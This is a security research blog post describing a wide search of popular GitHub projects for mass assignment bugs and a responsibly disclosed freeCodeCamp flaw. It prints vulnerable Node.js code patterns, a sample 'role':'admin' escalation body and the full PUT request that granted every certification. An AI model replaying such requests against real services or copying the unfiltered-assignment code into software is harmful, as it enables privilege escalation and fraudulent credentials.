---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-07-26_hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grepapp.md
original_filename: 2022-07-26_hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grepapp.md
title: Hunting For Mass Assignment Vulnerabilities Using GitHub CodeSearch and grep.app
category: documents
detected_topics:
- api-security
- csrf
- access-control
- sqli
- command-injection
- otp
tags:
- imported
- documents
- api-security
- csrf
- access-control
- sqli
- command-injection
- otp
language: en
raw_sha256: 29cf218652883b24f81fceb409bea64215f8a2b70b6ddc69276dedcdfb87e49d
text_sha256: c61a05e7647b443f7256e9df4a3339ed2678c5663595c5936afe1afb631d7686
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: false
---

# Hunting For Mass Assignment Vulnerabilities Using GitHub CodeSearch and grep.app

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-07-26_hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grepapp.md
- Source Type: markdown
- Detected Topics: api-security, csrf, access-control, sqli, command-injection, otp
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: False
- Raw SHA256: `29cf218652883b24f81fceb409bea64215f8a2b70b6ddc69276dedcdfb87e49d`
- Text SHA256: `c61a05e7647b443f7256e9df4a3339ed2678c5663595c5936afe1afb631d7686`


## Content

---
title: "Hunting For Mass Assignment Vulnerabilities Using GitHub CodeSearch and grep.app"
page_title: "Hunting For Mass Assignment Vulnerabilities Using GitHub CodeSearch and grep.app - Include Security Research Blog"
url: "https://blog.includesecurity.com/2022/07/hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grep-app/"
final_url: "https://blog.includesecurity.com/2022/07/hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grep-app/"
authors: ["Laurence Tennant"]
programs: ["freeCodeCamp"]
bugs: ["Mass assignment"]
publication_date: "2022-07-26"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2396
---

![Hacked freeCodeCamp Certification](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/05/cert3.png?fit=1180%2C939&ssl=1)

# Hunting For Mass Assignment Vulnerabilities Using GitHub CodeSearch and grep.app

July 28, 2022July 26, 2022 — Laurence Tennant

This post discusses the process of searching top GitHub projects for mass assignment vulnerabilities. This led to a fun finding in the #1 most starred GitHub project, [freeCodeCamp](https://www.freecodecamp.org/), where I was able to acquire every coding certification – supposedly representing over 6000 hours of study – in a single request.

## Searching GitHub For Vulnerabilities

With more than 200 million repositories, GitHub is by far the largest code host. While the vast majority of repositories contain boilerplate code, forks, or abandoned side projects, GitHub also hosts some of the most important open source projects. To some extent [Linus’s law](https://en.wikipedia.org/wiki/Linus%27s_law) – “given enough eyeballs, all bugs are shallow” – has been [empirically shown](https://arxiv.org/abs/2007.10912) on GitHub, as projects with more stars also had more bug fixes. We might therefore expect the [top repositories](https://gitstar-ranking.com/) to have a lower number of security vulnerabilities, especially given the incentives to find vulnerabilities such as bug bounties and CVE fame. 

Undeterred by Linus’s law, I wanted to see how quickly I could find a vulnerability in a popular GitHub project. The normal approach would be to dig into the code of an individual project, and learn the specific conventions and security assumptions behind it. Combine with a strong understanding of a particular vulnerability class, such as Java deserialization, and use of code analysis tools to map the attack surface, and we have the ingredients to find fantastic exploits which everyone else missed such as [Alvaro Munoz’s attacks on Apache Dubbo](https://securitylab.github.com/research/apache-dubbo/).

However, to try and find something fast, I wanted to investigate a “wide” rather than a “deep” approach of vuln-hunting. This was motivated by the [beta release of GitHub’s new CodeSearch tool](https://github.blog/2021-12-08-improving-github-code-search/). The idea was to find vulnerabilities through querying for specific antipatterns across the GitHub project corpus.

The vulnerability class I chose to focus on was mass assignment, I’ll describe why just after a quick refresher.

## Mass Assignment

A mass assignment vulnerability can occur when an API takes data that a user provides, and stores it without filtering for allow-listed properties. This can enable an attacker to modify attributes that the user should not be allowed to access.

A simple example is when a User model contains a “role” property which specifies whether a user has admin permissions; consider the following User model:

  * `name`
  * `email`
  * `role`

And a user registration function which saves all attributes specified in the request body to a new user instance:
  
  
  exports.register = (req, res) => {
  user = new User(req.body);
  user.save();}

A typical request from a frontend to this endpoint might look like:
  
  
  POST /users/register
  
  {
  "name": "test",
  "email": "test@test.com"
  }

However, by modifying the request to add the “role” property, a low-privileged attacker can cause its value to be saved. The attacker’s new account will gain administrator privileges in the application:
  
  
  {  
  "name": "test",  
  "email": "test@test.com",  
  "role": "admin"  
  }

The mass assignment bug class is [#6 on the OWASP API Security Top 10](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa6-mass-assignment.md). One of the most notorious vulnerability disclosures, back in 2012, was when researcher Egar Homakov used a mass assignment exploit against GitHub to add his own public key to the [Ruby on Rails repository](http://homakov.blogspot.com/2012/03/how-to.html) and [commit a message directly to the master branch.](https://github.com/rails/rails/commit/b83965785db1eec019edf1fc272b1aa393e6dc57)

## Why Mass Assignment?

This seemed like a good vulnerability class to focus on, for several reasons:

  * In the webapp assessments we do, we often find mass assignments, possibly because developers are less aware of this type of vuln compared to e.g. SQL injection.
  * They can be highly impactful, enabling privilege escalation and therefore full control over an application.
  * The huge variety of web frameworks have different ways of preventing/addressing mass assignment.
  * As in the above example, mass assignment vulns often occur on a single, simple line of code, making them easier to search for.

## Mass Assignment in Node.js

Mass assignment is well known in some webdev communities, particularly Ruby On Rails. Since [Rails 4](https://brakemanscanner.org/docs/warning_types/mass_assignment/) query parameters must be explicitly allow-listed before they can be used in mass assignments. Additionally, the Brakeman static analysis scanner has rules to catch any potentially dangerous attributes that have been accidentally allow-listed. 

Therefore, it seemed worthwhile to narrow the scope to the current web technologies du jour, Node.js apps, frameworks, and object-relational mappers (ORMs). Among these, there’s a variety of ways that mass assignment vulnerabilities can manifest, and less documentation and awareness of them in the community.

To give examples of different ways mass assignment can show up, in the [Mongoose ORM](https://mongoosejs.com/docs/tutorials/findoneandupdate.html), the `findOneAndUpdate`() method could facilitate a mass assignment vulnerability if taking attributes directly from the user: 
  
  
  const filter = {_id: req.body.id};  
  const update = req.body;  
  const updatedUser = await User.findOneAndUpdate(filter, update);

In the sophisticated [Loopback framework](https://loopback.io/doc/en/lb2/Controlling-data-access.html), model access is defined in ACLs, where an ACL like the following on a user model would allow a user to modify all their own attributes:
  
  
  {  
  "accessType": "*",  
  "principalType": "ROLE",  
  "principalId": "$owner",  
  "permission": "ALLOW",  
  "property": "*"  
  },

In the [Adonis.js framework](https://docs.adonisjs.com/guides/models/crud-operations), any of the following methods could be used to assign multiple attributes to an object:
  
  
  User.fill(), User.create(), User.createMany(), User.merge(), User.firstOrCreate(), User.fetchOrCreateMany(), User.updateOrCreate(), User.updateOrCreateMany()

The next step was to put together a shortlist of potentially-vulnerable code patterns like these, figure out how to search for them on GitHub, then filter down to those instances which actually accept user-supplied input.

## Limitations of GitHub Search

GitHub’s search feature has often been [criticized](https://github.com/isaacs/github/issues/908), and does not feel like it lives up to its potential. There are two major problems for our intended use-case:

  1. Global code searches of GitHub turns up an abundance of starter/boilerplate projects that have been abandoned years ago, which aren’t relevant. There is a “stars” operator to only return popular projects, e.g. `stars:>1000`, but it only works when searching metadata such as repository names and descriptions, [not when searching through code](https://github.com/github-community/community/discussions/8578).
  2. The following characters are ignored in GitHub search: `.,:;/\`'"=*!?#$&+^|~<>(){}[]@`. As key syntactical characters in most languages, it’s a major limitation that they can’t be searched for.

The first two results when searching for “`user.update(req.body)`” illustrate this: 

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/07/image.png?resize=1024%2C531&ssl=1)

The first result looks like it might be vulnerable, but is a project with zero stars that has had no commits in years. The second result is semantically different than what we searched. Going through all 6000+ results when 99% of the results are like this is tedious.

These restrictions previously led some security researchers to use Google BigQuery to run complex queries against the [3 terabyte GitHub dataset](https://console.cloud.google.com/marketplace/product/github/github-repos) that was released in 2016. While this can [produce good results](https://www.sjoerdlangkemper.nl/2017/06/07/finding-vulnerable-code-in-github-with-bigquery/), it doesn’t appear that the dataset has been updated recently. Further, running queries on such a large amount of data quickly becomes prohibitively expensive.

## GitHub CodeSearch

GitHub’s new CodeSearch tool is currently available at <https://cs.github.com/> for those who have been admitted to the technology preview. The improvements include exact string search, an increased number of filters and boolean operators, and better search indexing. The CodeSearch index right now includes 7 million public repositories, chosen due to popularity and recent activity.

Trying the same query as before, the results load a lot faster and look more promising too:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/07/image-2.png?resize=1024%2C700&ssl=1)

The repositories showing up first actually have stars, however they all have less than 10. Unfortunately only 100 results are currently returned from a query, and once again, none of the repositories that showed up in my searches were particularly relevant. I looked for a way to sort by stars, but that [doesn’t exist](https://cs.github.com/about/syntax). So for our purposes, CodeSearch solves one of the problems with GitHub search, and is likely great for searching individual codebases, but is not yet suitable for making speculative searches across a large number of projects.

## grep.app

Looking for a better solution, I stumbled across a third-party service called [grep.app](https://grep.app/). It allows exact match and regex searches, and has only indexed 0.5 million GitHub repositories, therefore excluding a lot of the noise that has clogged up the results so far.

Trying the naïve mass assignment search once again:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/07/image-3.png?resize=1024%2C477&ssl=1)

Only 22 results are returned, but they are high-quality results! The first repo shown has over 800 stars. I was excited – finally, here was a search engine which could make the task efficient, especially with regex searches.

With the search space limited to top GitHub projects, I could now search for method names and get a small enough selection of results to scan through manually. This was important as “`req.body`” or other user input usually gets assigned to another variable before being used in a database query. To my knowledge there is no way to express these data flows in searches. [CodeQL ](https://codeql.github.com/)is great for tracking malicious input (taint tracking) over a small number of projects, but it can’t be used to make a “wide” query across GitHub.

## Mass Assignment In FreeCodeCamp

Searching for “`user.updateAttributes(`“, the first match was for freeCodeCamp, the #1 most starred GitHub project, with over 350k stars:

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/07/image-5.png?resize=1024%2C656&ssl=1)

Looking at the code in the first result, we appeared to have a classic mass assignment vulnerability:
  
  
  function updateUserFlag(req, res, next) {  
  const { user, body: update } = req;  
  return user.updateAttributes(update, createStandardHandler(req, res, next));  
  }

## Acquiring All Certifications on freeCodeCamp

The next step was to ensure that this function could be reached from a public-facing route within the application, and it turned out to be as simple as a PUT call to `/update-user-flag`: a route originally added in order that you could change your theme on the site.

I created an account on freeCodeCamp’s dev environment, and also looked at the user model in the codebase to find what [attributes I could maliciously modify](https://github.com/freeCodeCamp/freeCodeCamp/blob/93b3151cca51becd237c3a58083f99a02b5059fb/tools/scripts/seed/seedAuthUser.js#L91). Although freeCodeCamp did not have roles or administrative users, all the certificate information was stored in the user model.

Therefore, the exploit simply involved making the following request:
  
  
  PUT /update-user-flag HTTP/2
  Host: api.freecodecamp.dev
  Cookie: _csrf=lsCzfu4[...]
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Referer: https://www.freecodecamp.dev/
  Csrf-Token: Tu0VHrwW-GJvZ4ly1sVEXjHxSzgPLLj99OLQ
  Content-Type: application/json
  Origin: https://www.freecodecamp.dev
  Content-Length: 518
  Sec-Fetch-Dest: empty
  Sec-Fetch-Mode: cors
  Sec-Fetch-Site: same-site
  Te: trailers
  
  {
  "name": "Mass Assignment",
  "isCheater": false,
  "isHonest": true,
  "isInfosecCertV7":true,
  "isApisMicroservicesCert":true,
  "isBackEndCert":true,
  "is2018DataVisCert":true,
  "isDataVisCert":true,
  "isFrontEndCert":true,
  "isFullStackCert":true,
  "isFrontEndLibsCert":true,
  "isInfosecQaCert":true,
  "isQaCertV7":true,
  "isInfosecCertV7":true,
  "isJsAlgoDataStructCert":true,
  "isRelationalDatabaseCertV8":true,
  "isRespWebDesignCert":true,
  "isSciCompPyCertV7":true,
  "isDataAnalysisPyCertV7":true,
  "isMachineLearningPyCertV7":true
  }

After sending the request, a bunch of signed certifications showed up on my profile, each one supposedly requiring 300 hours of work.

![](https://i0.wp.com/blog.includesecurity.com/wp-content/uploads/2022/07/Screenshot-2022-03-31-191357.png?resize=1024%2C901&ssl=1)

Some aspiring developers use freeCodeCamp certifications as evidence of their coding skills and education, so anything that calls into question the integrity of those certifications is bad for the platform. There are certainly other ways to cheat, but those require more effort than sending a single request. 

I reported this to freeCodeCamp, and they promptly fixed the vulnerability and released a [GitHub security advisory](https://github.com/freeCodeCamp/freeCodeCamp/security/advisories/GHSA-cc3r-grh4-27gj).

## Conclusion

Overall, it turned out that a third-party service, grep.app, is much better than both GitHub’s old and new search for querying across a large number of popular GitHub projects. The fact that we were able to use it to so quickly discover a vuln in a top repository suggests there’s a lot more good stuff to find. The key was to be highly selective so as to not get overwhelmed by results.

I expect that GitHub CodeSearch will continue to improve, and hope they will offer a “stars” qualifier by the time the feature reaches general availability.

### Share this:

  * [ Share on X (Opens in new window) X ](https://blog.includesecurity.com/2022/07/hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grep-app/?share=twitter)
  * [ Share on Facebook (Opens in new window) Facebook ](https://blog.includesecurity.com/2022/07/hunting-for-mass-assignment-vulnerabilities-using-github-codesearch-and-grep-app/?share=facebook)
  * 

### Like this:

Like Loading…

Categories [appsec](https://blog.includesecurity.com/category/appsec/), [github](https://blog.includesecurity.com/category/github/) Tags [freecodecamp](https://blog.includesecurity.com/tag/freecodecamp/), [github](https://blog.includesecurity.com/tag/github/), [github codesearch](https://blog.includesecurity.com/tag/github-codesearch/), [grep.app](https://blog.includesecurity.com/tag/grep-app/), [mass assignment](https://blog.includesecurity.com/tag/mass-assignment/), [mass assignment vulnerabilities](https://blog.includesecurity.com/tag/mass-assignment-vulnerabilities/), [node.js mass assignment](https://blog.includesecurity.com/tag/node-js-mass-assignment/), [open source security](https://blog.includesecurity.com/tag/open-source-security/) Post navigation

[Working with vendors to “fix” unfixable vulnerabilities: Netgear BR200/BR500](https://blog.includesecurity.com/2022/05/working-with-vendors-to-fix-unfixable-vulnerabilities-br200/)

[Reverse Engineering Windows Printer Drivers (Part 1)](https://blog.includesecurity.com/2022/08/reverse-engineering-windows-drivers-part-1/)
